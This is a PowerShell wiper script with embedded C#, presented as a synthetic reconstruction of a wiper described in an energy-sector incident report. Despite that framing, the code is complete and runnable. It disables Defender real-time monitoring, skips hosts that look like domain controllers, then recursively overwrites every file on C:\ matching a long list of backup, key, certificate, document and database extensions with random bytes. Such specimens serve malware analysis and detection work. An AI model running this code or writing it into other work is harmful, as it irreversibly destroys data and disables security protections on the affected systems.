# Synthetic specimen — LazyWiper behavioral pattern (CERT Polska report)
# Reconstructed from published code fragments in the Energy Sector
# Incident Report, 29 December 2025. NOT the real sample.

$CSharpCode = @"
using System;
using System.IO;
public class RandomByteWriter
{
    public void WriteRandomBytes(string filePath)
    {
        using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
        {
            Random random = new Random();
            byte[] buffer = new byte[32];
            long initialPos = fileStream.Length;
            fileStream.Seek(0, SeekOrigin.Begin);
            // Loop until reaching the end of the file
            while (fileStream.Position < initialPos)
            {
                // Write random bytes at the current position
                random.NextBytes(buffer);
                fileStream.Write(buffer, 0, buffer.Length);
                // Seek 16 bytes forward
                fileStream.Seek(16, SeekOrigin.Current);
            }
        }
    }
}
"@

Add-Type -TypeDefinition $CSharpCode;
$writer = New-Object RandomByteWriter;
Set-MpPreference -DisableRealTimeMonitoring $True;
$s1=[System.Net.Dns]::GetHostName().ToLower();
$s2=$env:COMPUTERNAME.ToLower();
if($s1.Contains("pe-dc")){
exit;
}
if($s2.Contains("pe-dc")){
exit;
}

$exts = @(".rar",".tar.gz",".zip",".7z",".json",".bcp",".bak",".gho",".erf",".edb",
".onepkg",".pst",".ldiff",".pcf",".pfx",".crt",".pcks",".key",".pcks12",".pcks7",
".p7b",".pem",".rtf",".asd",".wbk",".xlk",".dit",".xlsx",".pcp",".old",".png",
".odt",".doc",".cfe",".acd",".xsd",".vbm",".vhd",".vsdx",".vsd",".jpg",".prj",
".nwf",".dll",".nwd",".sln",".log",".jpeg",".dt",".lcd",".cad",".ddf",".xls",
".nwc",".dat",".xml",".doc",".docx",".adt",".proj",".img",".sql",".vib",".txt",
".sta",".xdw",".epf",".bak",".vss",".cfl",".bkp",".dwg",".pdf",".ger",".exe")

Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $exts -contains $_.Extension } |
    ForEach-Object { $writer.WriteRandomBytes($_.FullName) }
